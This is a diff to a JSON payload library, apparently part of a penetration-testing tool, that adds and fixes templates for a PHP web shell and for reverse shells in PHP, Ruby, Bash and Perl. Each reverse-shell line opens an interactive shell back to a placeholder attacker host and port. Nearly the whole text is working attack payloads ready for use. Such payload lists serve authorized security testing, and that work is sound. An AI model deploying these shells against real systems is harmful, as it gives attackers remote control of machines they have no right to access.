@@ -29,15 +29,16 @@
       "payloads": [
         {
           "name": "One-liner Web Shell",
-          "template": "<?php system($_GET['cmd']); ?>"
+          "template": "<?php system($_GET['cmd']); ?>",
+          "requires_target": false
         },
         {
-          "name": "One-linerReverse Shell",
-          "template": "php -r \"$sock=fsockopen(\"{{LHOST}}\",{{LPORT}});exec(\"/bin/bash -i <&3 >&3 2>&3\");\""
+          "name": "One-liner Reverse Shell",
+          "template": "php -r \"$sock=fsockopen('{{LHOST}}',{{LPORT}});exec('/bin/bash -i <&3 >&3 2>&3');\""
         },
         {
           "name": "Reverse Shell (File)",
-          "path": "asdf"
+          "path": "reverse-shell.php"
         }
       ]
     },
@@ -47,6 +48,28 @@
         {
           "name": "Reverse Shell",
           "template": "ruby -rsocket -e'f=TCPSocket.open(\"{{LHOST}}\",{{LPORT}}).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'"
+        }
+      ]
+    },
+    {
+      "name": "Bash",
+      "payloads": [
+        {
+          "name": "Reverse Shell",
+          "template": "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1"
+        },
+        {
+          "name": "Reverse Shell (Bourne Shell)",
+          "template": "bash -c 'bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1'"
+        }
+      ]
+    },
+    {
+      "name": "Perl",
+      "payloads": [
+        {
+          "name": "Reverse Shell",
+          "template": "perl -e 'use Socket;$i=\"{{LHOST}}\";$p={{LPORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,$i))) {open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
         }
       ]
     }
